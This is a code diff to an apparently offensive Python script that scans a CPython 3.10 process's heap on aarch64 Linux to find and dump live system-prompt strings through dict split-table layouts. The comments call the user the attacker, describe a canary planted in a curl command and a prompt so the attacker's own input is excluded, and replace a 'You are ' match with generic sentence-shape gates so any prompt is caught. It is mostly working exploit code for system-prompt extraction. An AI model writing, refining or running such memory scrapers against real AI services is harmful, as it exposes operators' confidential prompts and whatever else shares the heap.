@@ -11,8 +11,15 @@ per-instance ma_values array. The me_value slot is always NULL in the
 shared keys structure. To resolve:
   1. Locate a candidate ma_values array (an 8-byte-aligned window of
      pointers in writable memory where at least one pointer dereferences
-     to a PyUnicodeObject whose body is prompt-shaped).
-  2. That prompt-shaped PyUnicodeObject IS the live instance value.
+     to a PyUnicodeObject that passes sentence-shape gates and is NOT
+     marked with the caller's USER_CANARY).
+  2. That PyUnicodeObject IS the live instance value.
+
+Discrimination: no content-shape assumption like 'starts with "You are "'.
+Instead we combine (a) generic sentence-shape heuristics that rule out
+identifiers, docstrings, and binary blobs, and (b) a caller-provided
+USER_CANARY that tags the attacker's own user input (command line,
+questions, stream buffers) so its many heap copies don't false-positive.
 
 CPython 3.10 layouts (from Include/cpython/dictobject.h):
   PyDictObject:
@@ -28,6 +35,12 @@ import struct
 # Valid userspace pointer range on aarch64 Linux: ~0x100 up to 2^48.
 MIN_PTR = 0x1000
 MAX_PTR = 0x0000_ffff_ffff_ffff  # 48-bit VA
+
+# Canary embedded by the caller (as a URL fragment in the curl command and
+# as a trace-tag in the user prompt). Any PyUnicode containing it is a
+# fragment of the attacker's own user input (command line, questions,
+# stream buffers) and must be excluded from prompt candidates.
+USER_CANARY = b'USR-CANARY-7B3F9A2E1D0C4F6'
 
 
 def is_valid_ptr(p):
@@ -210,11 +223,40 @@ print('null_count=%d combined_good_deref=%d' % (null_count, combined_good))
 # -------------------- stage 4: split-table values-array search --------------
 # Heuristic: walk writable memory as candidate 16-pointer windows. Any
 # window where at least one pointer dereferences to a PyUnicode whose body
-# starts with "You are " and is >=40 bytes long is a candidate instance
-# values array. The matching PyUnicodeObject IS the live prompt value.
+# is sentence-shaped (see is_sentence_shaped) and >=40 bytes long is a
+# candidate instance values array.
+#
+# We intentionally do NOT match on specific content like 'You are '.
+# Discrimination comes from two generic signals:
+#   - sentence-shape gates that rule out identifiers, docstrings, binary
+#     blobs, and single-word strings
+#   - USER_CANARY exclusion, which drops any PyUnicode that's a fragment
+#     of the caller's own input (command line, trace-tagged questions,
+#     stream buffers)
 
-print('---STAGE 4: split-table search (prompt-shaped string in values array) ---')
+def is_sentence_shaped(body):
+    """Generic 'looks like an English sentence' gates. Every natural-
+    language system prompt passes; CPython internals, identifiers,
+    docstrings, and source-code fragments fail."""
+    if not body:
+        return False
+    if body[0] in (0x20, 0x09, 0x0a, 0x0d):  # leading whitespace
+        return False
+    if 0 in body:  # binary
+        return False
+    if b' ' not in body[:20]:  # identifier / single word
+        return False
+    if body.count(b' ') < 5:  # too few words
+        return False
+    if (b'def ' in body[:64] or b'import ' in body[:64]
+            or b'self.' in body[:64]):
+        return False
+    return True
+
+
+print('---STAGE 4: split-table search (sentence-shaped, canary-filtered) ---')
 found_prompts = []
+excluded_user_prompts = 0
 scan_budget = 500_000
 windows_checked = 0
 try:
@@ -245,20 +287,26 @@ try:
                     if decoded is None:
                         continue
                     L, body = decoded
-                    if L >= 40 and body.startswith(b'You are '):
-                        found_prompts.append({
-                            'values_array_addr': lo + off,
-                            'ptr_slot_in_array': k,
-                            'prompt_ptr': p,
-                            'prompt_len': L,
-                            'prompt_body': body,
-                        })
+                    if L < 40:
+                        continue
+                    if USER_CANARY in body:
+                        excluded_user_prompts += 1
+                        continue
+                    if not is_sentence_shaped(body):
+                        continue
+                    found_prompts.append({
+                        'values_array_addr': lo + off,
+                        'ptr_slot_in_array': k,
+                        'prompt_ptr': p,
+                        'prompt_len': L,
+                        'prompt_body': body,
+                    })
             windows_checked += 1
             off += 8
 except Exception as e:
     print('STAGE 4 crashed: %s' % e)
-print('windows_checked=%d prompt_candidates=%d' %
-      (windows_checked, len(found_prompts)))
+print('windows_checked=%d prompt_candidates=%d excluded_user_prompts=%d' %
+      (windows_checked, len(found_prompts), excluded_user_prompts))
 
 # Dedupe by prompt_ptr.
 seen = {}
